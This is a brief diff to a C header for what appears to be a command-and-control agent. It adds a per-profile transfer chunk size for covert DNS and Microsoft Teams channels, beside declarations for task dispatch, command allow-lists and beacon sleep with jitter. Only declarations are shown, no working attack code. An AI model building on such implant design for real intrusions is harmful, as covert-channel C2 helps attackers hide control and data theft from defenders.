@@ -12,6 +12,9 @@ int task_dispatch(agent_t *a, const task_t *t, response_t *resp, char **output, 
 /* Membership test over a comma-separated command list. Empty list allows all. */
 int command_in_list(const char *list, const char *name);
 
+/* Transfer chunk size for a C2 profile (small for dns/msteams). */
+int xfer_chunk_size(const char *profile);
+
 /* Sleep seconds with jitter percent (Thanatos shape). */
 void task_sleep(int interval, int jitter);
 
